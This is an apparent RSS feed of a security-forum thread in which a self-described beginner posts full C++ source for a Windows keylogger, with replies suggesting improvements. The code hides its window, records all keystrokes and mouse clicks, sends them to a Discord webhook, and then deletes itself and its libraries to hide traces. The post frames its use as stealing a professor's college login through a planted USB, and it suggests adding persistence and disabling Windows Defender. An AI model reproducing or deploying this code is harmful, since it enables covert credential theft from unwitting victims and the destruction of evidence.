<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Own a Windows Keyboard</title>
    <link>https://0x00sec.org/t/own-a-windows-keyboard/34534</link>
    <description># Windows 10 Keylogger written in C++

**FOREWORD**
I am a beginner in C/C++ and especially malware development in Windows. So I have made a keylogger for Windows, that is pretty basic, but probably a bit different from others.

*Please note that it was written for **EDUCATIONAL PURPOSES***
*The scenario that is mentioned in the blog is **fictional***

------------------------------------
**INTRODUCTION**
There are various different malware and lots of different projects I could develop. In the end, I was out of ideas and nothing would drive me. There was no use for me to write any projects because I didn&#39;t have motivation, or some sort of reward system in my head. I could write a simple rootkit for Linux, but I wouldn&#39;t use it anywhere - no reward. 

I made up this scenario in my head where I had to write malware for a specific target that I want to get data from. So I came up with an idea of a keylogger. What if I had to get into the website of my college? My college professor had logins to the college website where I could send emails, change grades and more. I could own the system. But how?

This exciting plan came to mind. The professor logs in to the website during class. I could bring a USB with some type of malware and plug it in his PC when he&#39;s out of the class, move the executable to some random folder and run it there. The malware then logs all keystrokes for x minutes, after that it returns the keystrokes to my Discord server through a webhook and the executable self-deletes hiding its traces.

-------------------------

**DOCUMENTATION**
I&#39;m not skilled enough to write code that is functional to send messages to a Discord webhook, although I am skilled enough to find a library that does it for me. I found this library D++, it&#39;s a Discord C++ library and it does everything that I need.

*How the keylogger is supposed to work:* 

- Run silently in background
- Log all keys
- Count time using threads at the same time
- After time expires send all keys to Discord webhook
- Self-delete and hide all traces

```cpp
using std::thread;
using std::string;
using std::cout;

void countTime(); // counts time
void StealthMode(); // runs in the background
void StartLogging(string&amp;); // logs all keys to a string
void SendKeyz(string); // send keys
void DelMe(); // self-delete
// Defining the functions
```
Writing functions in a class Functions. No idea what I&#39;m doing, but it works :smile: 
```cpp
class Functions {
public:
    void DelMe() // function to delete self after running
    {
        TCHAR szModuleName[MAX_PATH];
        TCHAR szCmd[2 * MAX_PATH];
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        GetModuleFileName(NULL, szModuleName, MAX_PATH);

        StringCbPrintf(szCmd, 2 * MAX_PATH, &quot;cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del /f /q \&quot;%s\&quot;&quot;, szModuleName); // cmd.exe ping ... del

        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        exit(0);
    }

    void countTime(string&amp; keyz) { // function to count for how much time to run the program
        int i = 30; // seconds for how long to run 
        for(;i=&lt;0;i--){
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        SendKeyz(keyz);
        DelMe();
    }
```
The self delete function and count time function, please let me know if there&#39;s something that needs changing.

Function that logs all the keys. You can add more keys or remove certain keys that you don&#39;t need. Even logs mouse clicks.
```cpp
void StartLogging(string&amp; keyz) { // function to log keys
        char c;

        for (;;) {

            for (c = 8; c &lt;= 222; c++) {
                if (GetAsyncKeyState(c) == -32767) {

                    if (((c &gt; 64) &amp;&amp; (c &lt; 91)) &amp;&amp; !(GetAsyncKeyState(0x10)))
                    {
                        c += 32;
                        keyz += c;
                        
                        break;
                    }
                    else if ((c &gt; 64) &amp;&amp; (c &lt; 91))
                    {
                        keyz += c;
                       
                        break;
                    }
                    else {

                        switch (c)
                        {
                        case 48:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;)&quot;;
                            else
                                keyz += &quot;0&quot;;
                        }
                        break;

                        case 49:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;!&quot;;
                            else
                                keyz += &quot;1&quot;;
                        }
                        break;

                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;@&quot;;
                            else
                                keyz += &quot;2&quot;;
                        }
                        break;

                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;#&quot;;
                            else
                                keyz += &quot;3&quot;;
                        }
                        break;

                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;$&quot;;
                            else
                                keyz += &quot;4&quot;;
                        }
                        break;

                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;%&quot;;
                            else
                                keyz += &quot;5&quot;;
                        }
                        break;

                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;^&quot;;
                            else
                                keyz += &quot;6&quot;;
                        }
                        break;

                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;&amp;&quot;;
                            else
                                keyz += &quot;7&quot;;
                        }
                        break;

                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;*&quot;;
                            else
                                keyz += &quot;8&quot;;
                        }
                        break;

                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;(&quot;;
                            else
                                keyz += &quot;9&quot;;
                        }
                        break;

                        case VK_SPACE:
                            keyz += &quot; &quot;;
                            break;
                        case VK_RETURN:
                            keyz += &quot;\n&quot;;
                            break;
                        case VK_TAB:
                            keyz += &quot;  &quot;;
                            break;
                        case VK_BACK:
                            keyz += &quot; &lt;BACKSPACE&gt; &quot;;
                            break;
                        case VK_DELETE:
                            keyz += &quot; &lt;Del&gt; &quot;;
                            break;
                        case VK_NUMPAD0:
                            keyz += &quot;0&quot;;
                            break;
                        case VK_NUMPAD1:
                            keyz += &quot;1&quot;;
                            break;
                        case VK_NUMPAD2:
                            keyz += &quot;2&quot;;
                            break;
                        case VK_NUMPAD3:
                            keyz += &quot;3&quot;;
                            break;
                        case VK_NUMPAD4:
                            keyz += &quot;4&quot;;
                            break;
                        case VK_NUMPAD5:
                            keyz += &quot;5&quot;;
                            break;
                        case VK_NUMPAD6:
                            keyz += &quot;6&quot;;
                            break;
                        case VK_NUMPAD7:
                            keyz += &quot;7&quot;;
                            break;
                        case VK_NUMPAD8:
                            keyz += &quot;8&quot;;
                            break;
                        case VK_NUMPAD9:
                            keyz += &quot;9&quot;;
                            break;
                        case VK_LBUTTON:
                            keyz += &quot; **MOUSE_LEFT** &quot;;
                            break;
                        case VK_RBUTTON:
                            keyz += &quot; **MOUSE RIGHT** &quot;;
                            break;
                        case VK_CAPITAL:
                            keyz += &quot; **CAPS** &quot;;
                            break;
                        case VK_SHIFT:
                            keyz += &quot; **SHIFT** &quot;;
                            break;
                        default:
                            keyz += c;
                        }
                    }
                }
            }
        }
    }
```
Function to run in the background and the other one to send keys to the Discord webhook using D++ library.
```cpp
void StealthMode() { // function to hide window and run in the background
        AllocConsole();
        HWND stealth = FindWindowA(&quot;ConsoleWindowClass&quot;, NULL);
        ShowWindow(stealth, 0);
    }

    void SendKeyz(string keyz) // function to send logged keys to discord webhook
    {
        dpp::cluster bot(&quot;&quot;);
        dpp::webhook wh(&quot;WEBHOOK&quot;); // replace with your discord webhook. could probably encrypt it or something if someone decides to reverse engineer the malware
        bot.execute_webhook(wh, dpp::message(keyz));     
    }
}
```
The main function. Using threads, which uses a lot of CPU, but I have ran into issues when not using threads at all.
```cpp
int main() {
    Functions FunctionObject;
    string c;

    thread t1(&amp;Functions::countTime, &amp;FunctionObject, ref(c));
    thread t2(&amp;Functions::StartLogging, &amp;FunctionObject, ref(c));
    thread t3(&amp;Functions::StealthMode, &amp;FunctionObject);

    t1.detach();
    t2.join();
    t1.join();
    t3.join();

    return 0;
}
```
The whole code:
```cpp
#include &lt;dpp/dpp.h&gt;
#include &lt;iostream&gt;
#include &lt;winuser.h&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;
#include &lt;chrono&gt;
#include &lt;thread&gt;
#include &lt;windows.h&gt;
#include &lt;strsafe.h&gt;

// You&#39;ll need DPP dll file and a few other dll files in the same directory so I made a batch script to delete those as well
/*
timeout 3660 &gt; NUL
del /f dpp.dll &amp;&amp; del /f libcrypto-1_1-x64.dll &amp;&amp; del /f libsodium.dll
del /f libssl-1_1-x64.dll &amp;&amp; del /f opus.dll &amp;&amp; del /f zlib1.dll
del /f Srfx.exe
(goto) 2&gt;nul &amp; del &quot;%~f0&quot;
*/

using std::thread;
using std::string;
using std::cout;

void countTime();
void StealthMode();
void StartLogging(string&amp;);
void SendKeyz(string);
void DelMe();

class Functions {
public:
    void DelMe() // function to delete self after running
    {
        TCHAR szModuleName[MAX_PATH];
        TCHAR szCmd[2 * MAX_PATH];
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        GetModuleFileName(NULL, szModuleName, MAX_PATH);

        StringCbPrintf(szCmd, 2 * MAX_PATH, &quot;cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del /f /q \&quot;%s\&quot;&quot;, szModuleName); // cmd.exe ping ... del

        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        exit(0);
    }

    void countTime(string&amp; keyz) { // function to count for how much time to run the program
        int i=30;
        for(;i=&lt;0;i--){
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        SendKeyz(keyz);
        DelMe();
    }

    void StartLogging(string&amp; keyz) { // function to log keys
        char c;

        for (;;) {

            for (c = 8; c &lt;= 222; c++) {
                if (GetAsyncKeyState(c) == -32767) {

                    if (((c &gt; 64) &amp;&amp; (c &lt; 91)) &amp;&amp; !(GetAsyncKeyState(0x10)))
                    {
                        c += 32;
                        keyz += c;
                        
                        break;
                    }
                    else if ((c &gt; 64) &amp;&amp; (c &lt; 91))
                    {
                        keyz += c;
                       
                        break;
                    }
                    else {

                        switch (c)
                        {
                        case 48:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;)&quot;;
                            else
                                keyz += &quot;0&quot;;
                        }
                        break;

                        case 49:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;!&quot;;
                            else
                                keyz += &quot;1&quot;;
                        }
                        break;

                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;@&quot;;
                            else
                                keyz += &quot;2&quot;;
                        }
                        break;

                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;#&quot;;
                            else
                                keyz += &quot;3&quot;;
                        }
                        break;

                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;$&quot;;
                            else
                                keyz += &quot;4&quot;;
                        }
                        break;

                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;%&quot;;
                            else
                                keyz += &quot;5&quot;;
                        }
                        break;

                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;^&quot;;
                            else
                                keyz += &quot;6&quot;;
                        }
                        break;

                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;&amp;&quot;;
                            else
                                keyz += &quot;7&quot;;
                        }
                        break;

                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;*&quot;;
                            else
                                keyz += &quot;8&quot;;
                        }
                        break;

                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += &quot;(&quot;;
                            else
                                keyz += &quot;9&quot;;
                        }
                        break;

                        case VK_SPACE:
                            keyz += &quot; &quot;;
                            break;
                        case VK_RETURN:
                            keyz += &quot;\n&quot;;
                            break;
                        case VK_TAB:
                            keyz += &quot;  &quot;;
                            break;
                        case VK_BACK:
                            keyz += &quot; &lt;BACKSPACE&gt; &quot;;
                            break;
                        case VK_DELETE:
                            keyz += &quot; &lt;Del&gt; &quot;;
                            break;
                        case VK_NUMPAD0:
                            keyz += &quot;0&quot;;
                            break;
                        case VK_NUMPAD1:
                            keyz += &quot;1&quot;;
                            break;
                        case VK_NUMPAD2:
                            keyz += &quot;2&quot;;
                            break;
                        case VK_NUMPAD3:
                            keyz += &quot;3&quot;;
                            break;
                        case VK_NUMPAD4:
                            keyz += &quot;4&quot;;
                            break;
                        case VK_NUMPAD5:
                            keyz += &quot;5&quot;;
                            break;
                        case VK_NUMPAD6:
                            keyz += &quot;6&quot;;
                            break;
                        case VK_NUMPAD7:
                            keyz += &quot;7&quot;;
                            break;
                        case VK_NUMPAD8:
                            keyz += &quot;8&quot;;
                            break;
                        case VK_NUMPAD9:
                            keyz += &quot;9&quot;;
                            break;
                        case VK_LBUTTON:
                            keyz += &quot; **MOUSE_LEFT** &quot;;
                            break;
                        case VK_RBUTTON:
                            keyz += &quot; **MOUSE RIGHT** &quot;;
                            break;
                        case VK_CAPITAL:
                            keyz += &quot; **CAPS** &quot;;
                            break;
                        case VK_SHIFT:
                            keyz += &quot; **SHIFT** &quot;;
                            break;
                        default:
                            keyz += c;
                        }
                    }
                }
            }
        }
    }
    void StealthMode() { // function to hide window and run in the background
        AllocConsole();
        HWND stealth = FindWindowA(&quot;ConsoleWindowClass&quot;, NULL);
        ShowWindow(stealth, 0);
    }

    void SendKeyz(string keyz) // function to send logged keys to discord webhook
    {
        dpp::cluster bot(&quot;&quot;);
        dpp::webhook wh(&quot;WEBHOOK&quot;);
        bot.execute_webhook(wh, dpp::message(keyz));     
    }
};

int main() {
    Functions FunctionObject;
    string c;

    thread t1(&amp;Functions::countTime, &amp;FunctionObject, ref(c));
    thread t2(&amp;Functions::StartLogging, &amp;FunctionObject, ref(c));
    thread t3(&amp;Functions::StealthMode, &amp;FunctionObject);

    t1.detach();
    t2.join();
    t1.join();
    t3.join();

    return 0;
}
```
You could add other features like adding it to startup or gaining admin privs and disabling windows defender, although last time I checked this was undetectable.

That&#39;s the end of this thread. This is my first post, so let me know if there&#39;s something wrong with it. Feel free to leave a like if you found this useful and let me know if there are any bugs that I&#39;m not aware of.

**Full Code**
https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook</description>
    
    <lastBuildDate>Wed, 24 May 2023 17:34:59 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/9</link>
        <pubDate>Tue, 15 Aug 2023 13:04:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-9</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[Shikigami-V]]></dc:creator>
        <description><![CDATA[
            <p>By using <code>GetAsyncKeyState</code> you will be burning the computer’s cpu since you are listening for keyboard event in the background, however if you did this in <code>SetWindowsHookEx</code> you will be hooking the data in the msg loop, which will be a much more relevant approach to eavesdrop keyboard events</p>
          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/7</link>
        <pubDate>Mon, 15 May 2023 14:49:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-7</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[RiskLimit]]></dc:creator>
        <description><![CDATA[
            <p>What’s the difference though? Between <code>GetAsyncKeyState</code> and <code>SetWindowsHookEx</code></p>
          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/6</link>
        <pubDate>Sun, 30 Apr 2023 10:18:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-6</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[RiskLimit]]></dc:creator>
        <description><![CDATA[
            <p>Full code:</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook">
  <header class="source">
      <img src="https://codeberg.org/assets/img/favicon.svg" class="site-icon" width="15" height="15">

      <a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">Codeberg.org</a>
  </header>

  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/3X/e/e/ee03c3e147b566430d65580159917e53b12deaf3.png" class="thumbnail onebox-avatar" width="290" height="290">

<h3><a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">WindowsKeylogger-DCWebhook</a></h3>

  <p>Windows10 C++ keylogger with Discord webhook implementation, run in background and threads. FUD on most AVs</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/5</link>
        <pubDate>Sun, 30 Apr 2023 10:17:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-5</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[RiskLimit]]></dc:creator>
        <description><![CDATA[
            <p>Hey everyone, thanks for all the replies! I’m a bit busy now, but once I have more time I’ll fix the code and update the post.</p>
          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/4</link>
        <pubDate>Thu, 27 Apr 2023 19:09:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-4</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[whatsacomputer]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="RiskLimit" data-post="1" data-topic="34534">
<div class="title">
<div class="quote-controls"></div>
<img loading="lazy" alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/risklimit/40/46481_2.png" class="avatar"> RiskLimit:</div>
<blockquote>
<p>Writing functions in a class Functions. No idea what I’m doing, but it works <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=12" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>
</blockquote>
</aside>
<p>mood. lmfao<br>
Why use keystates? You can open a hook to the keyboard and virtual keys for translation</p>
<p>also need github, anonfiles or such for the code. easier</p>
          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/3</link>
        <pubDate>Tue, 25 Apr 2023 03:49:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-3</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[Lemovice]]></dc:creator>
        <description><![CDATA[
            <p>Why are you using <code>GetAsyncKeyState</code>, just hook the keyboard with <code>SetWindowsHookEx</code> and <code>WH_KEYBOARD_LL</code>, Otherwise the code is good</p>
          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/2</link>
        <pubDate>Sat, 22 Apr 2023 19:53:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-2</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
      <item>
        <title>Own a Windows Keyboard</title>
        <dc:creator><![CDATA[RiskLimit]]></dc:creator>
        <description><![CDATA[
            <h1>
<a name="windows-10-keylogger-written-in-c-1" class="anchor" href="https://0x00sec.org#windows-10-keylogger-written-in-c-1"></a>Windows 10 Keylogger written in C++</h1>
<p><strong>FOREWORD</strong><br>
I am a beginner in C/C++ and especially malware development in Windows. So I have made a keylogger for Windows, that is pretty basic, but probably a bit different from others.</p>
<p><em>Please note that it was written for <strong>EDUCATIONAL PURPOSES</strong></em><br>
<em>The scenario that is mentioned in the blog is <strong>fictional</strong></em></p>
<hr>
<p><strong>INTRODUCTION</strong><br>
There are various different malware and lots of different projects I could develop. In the end, I was out of ideas and nothing would drive me. There was no use for me to write any projects because I didn’t have motivation, or some sort of reward system in my head. I could write a simple rootkit for Linux, but I wouldn’t use it anywhere - no reward.</p>
<p>I made up this scenario in my head where I had to write malware for a specific target that I want to get data from. So I came up with an idea of a keylogger. What if I had to get into the website of my college? My college professor had logins to the college website where I could send emails, change grades and more. I could own the system. But how?</p>
<p>This exciting plan came to mind. The professor logs in to the website during class. I could bring a USB with some type of malware and plug it in his PC when he’s out of the class, move the executable to some random folder and run it there. The malware then logs all keystrokes for x minutes, after that it returns the keystrokes to my Discord server through a webhook and the executable self-deletes hiding its traces.</p>
<hr>
<p><strong>DOCUMENTATION</strong><br>
I’m not skilled enough to write code that is functional to send messages to a Discord webhook, although I am skilled enough to find a library that does it for me. I found this library D++, it’s a Discord C++ library and it does everything that I need.</p>
<p><em>How the keylogger is supposed to work:</em></p>
<ul>
<li>Run silently in background</li>
<li>Log all keys</li>
<li>Count time using threads at the same time</li>
<li>After time expires send all keys to Discord webhook</li>
<li>Self-delete and hide all traces</li>
</ul>
<pre><code class="lang-cpp">using std::thread;
using std::string;
using std::cout;

void countTime(); // counts time
void StealthMode(); // runs in the background
void StartLogging(string&amp;); // logs all keys to a string
void SendKeyz(string); // send keys
void DelMe(); // self-delete
// Defining the functions
</code></pre>
<p>Writing functions in a class Functions. No idea what I’m doing, but it works <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=12" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>
<pre><code class="lang-cpp">class Functions {
public:
    void DelMe() // function to delete self after running
    {
        TCHAR szModuleName[MAX_PATH];
        TCHAR szCmd[2 * MAX_PATH];
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        GetModuleFileName(NULL, szModuleName, MAX_PATH);

        StringCbPrintf(szCmd, 2 * MAX_PATH, "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del /f /q \"%s\"", szModuleName); // cmd.exe ping ... del

        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        exit(0);
    }

    void countTime(string&amp; keyz) { // function to count for how much time to run the program
        int i = 30; // seconds for how long to run 
        for(;i=&lt;0;i--){
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        SendKeyz(keyz);
        DelMe();
    }
</code></pre>
<p>The self delete function and count time function, please let me know if there’s something that needs changing.</p>
<p>Function that logs all the keys. You can add more keys or remove certain keys that you don’t need. Even logs mouse clicks.</p>
<pre><code class="lang-cpp">void StartLogging(string&amp; keyz) { // function to log keys
        char c;

        for (;;) {

            for (c = 8; c &lt;= 222; c++) {
                if (GetAsyncKeyState(c) == -32767) {

                    if (((c &gt; 64) &amp;&amp; (c &lt; 91)) &amp;&amp; !(GetAsyncKeyState(0x10)))
                    {
                        c += 32;
                        keyz += c;
                        
                        break;
                    }
                    else if ((c &gt; 64) &amp;&amp; (c &lt; 91))
                    {
                        keyz += c;
                       
                        break;
                    }
                    else {

                        switch (c)
                        {
                        case 48:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += ")";
                            else
                                keyz += "0";
                        }
                        break;

                        case 49:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "!";
                            else
                                keyz += "1";
                        }
                        break;

                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "@";
                            else
                                keyz += "2";
                        }
                        break;

                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "#";
                            else
                                keyz += "3";
                        }
                        break;

                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "$";
                            else
                                keyz += "4";
                        }
                        break;

                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "%";
                            else
                                keyz += "5";
                        }
                        break;

                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "^";
                            else
                                keyz += "6";
                        }
                        break;

                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "&amp;";
                            else
                                keyz += "7";
                        }
                        break;

                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "*";
                            else
                                keyz += "8";
                        }
                        break;

                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "(";
                            else
                                keyz += "9";
                        }
                        break;

                        case VK_SPACE:
                            keyz += " ";
                            break;
                        case VK_RETURN:
                            keyz += "\n";
                            break;
                        case VK_TAB:
                            keyz += "  ";
                            break;
                        case VK_BACK:
                            keyz += " &lt;BACKSPACE&gt; ";
                            break;
                        case VK_DELETE:
                            keyz += " &lt;Del&gt; ";
                            break;
                        case VK_NUMPAD0:
                            keyz += "0";
                            break;
                        case VK_NUMPAD1:
                            keyz += "1";
                            break;
                        case VK_NUMPAD2:
                            keyz += "2";
                            break;
                        case VK_NUMPAD3:
                            keyz += "3";
                            break;
                        case VK_NUMPAD4:
                            keyz += "4";
                            break;
                        case VK_NUMPAD5:
                            keyz += "5";
                            break;
                        case VK_NUMPAD6:
                            keyz += "6";
                            break;
                        case VK_NUMPAD7:
                            keyz += "7";
                            break;
                        case VK_NUMPAD8:
                            keyz += "8";
                            break;
                        case VK_NUMPAD9:
                            keyz += "9";
                            break;
                        case VK_LBUTTON:
                            keyz += " **MOUSE_LEFT** ";
                            break;
                        case VK_RBUTTON:
                            keyz += " **MOUSE RIGHT** ";
                            break;
                        case VK_CAPITAL:
                            keyz += " **CAPS** ";
                            break;
                        case VK_SHIFT:
                            keyz += " **SHIFT** ";
                            break;
                        default:
                            keyz += c;
                        }
                    }
                }
            }
        }
    }
</code></pre>
<p>Function to run in the background and the other one to send keys to the Discord webhook using D++ library.</p>
<pre><code class="lang-cpp">void StealthMode() { // function to hide window and run in the background
        AllocConsole();
        HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0);
    }

    void SendKeyz(string keyz) // function to send logged keys to discord webhook
    {
        dpp::cluster bot("");
        dpp::webhook wh("WEBHOOK"); // replace with your discord webhook. could probably encrypt it or something if someone decides to reverse engineer the malware
        bot.execute_webhook(wh, dpp::message(keyz));     
    }
}
</code></pre>
<p>The main function. Using threads, which uses a lot of CPU, but I have ran into issues when not using threads at all.</p>
<pre><code class="lang-cpp">int main() {
    Functions FunctionObject;
    string c;

    thread t1(&amp;Functions::countTime, &amp;FunctionObject, ref(c));
    thread t2(&amp;Functions::StartLogging, &amp;FunctionObject, ref(c));
    thread t3(&amp;Functions::StealthMode, &amp;FunctionObject);

    t1.detach();
    t2.join();
    t1.join();
    t3.join();

    return 0;
}
</code></pre>
<p>The whole code:</p>
<pre><code class="lang-cpp">#include &lt;dpp/dpp.h&gt;
#include &lt;iostream&gt;
#include &lt;winuser.h&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;
#include &lt;chrono&gt;
#include &lt;thread&gt;
#include &lt;windows.h&gt;
#include &lt;strsafe.h&gt;

// You'll need DPP dll file and a few other dll files in the same directory so I made a batch script to delete those as well
/*
timeout 3660 &gt; NUL
del /f dpp.dll &amp;&amp; del /f libcrypto-1_1-x64.dll &amp;&amp; del /f libsodium.dll
del /f libssl-1_1-x64.dll &amp;&amp; del /f opus.dll &amp;&amp; del /f zlib1.dll
del /f Srfx.exe
(goto) 2&gt;nul &amp; del "%~f0"
*/

using std::thread;
using std::string;
using std::cout;

void countTime();
void StealthMode();
void StartLogging(string&amp;);
void SendKeyz(string);
void DelMe();

class Functions {
public:
    void DelMe() // function to delete self after running
    {
        TCHAR szModuleName[MAX_PATH];
        TCHAR szCmd[2 * MAX_PATH];
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        GetModuleFileName(NULL, szModuleName, MAX_PATH);

        StringCbPrintf(szCmd, 2 * MAX_PATH, "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del /f /q \"%s\"", szModuleName); // cmd.exe ping ... del

        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        exit(0);
    }

    void countTime(string&amp; keyz) { // function to count for how much time to run the program
        int i=30;
        for(;i=&lt;0;i--){
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        SendKeyz(keyz);
        DelMe();
    }

    void StartLogging(string&amp; keyz) { // function to log keys
        char c;

        for (;;) {

            for (c = 8; c &lt;= 222; c++) {
                if (GetAsyncKeyState(c) == -32767) {

                    if (((c &gt; 64) &amp;&amp; (c &lt; 91)) &amp;&amp; !(GetAsyncKeyState(0x10)))
                    {
                        c += 32;
                        keyz += c;
                        
                        break;
                    }
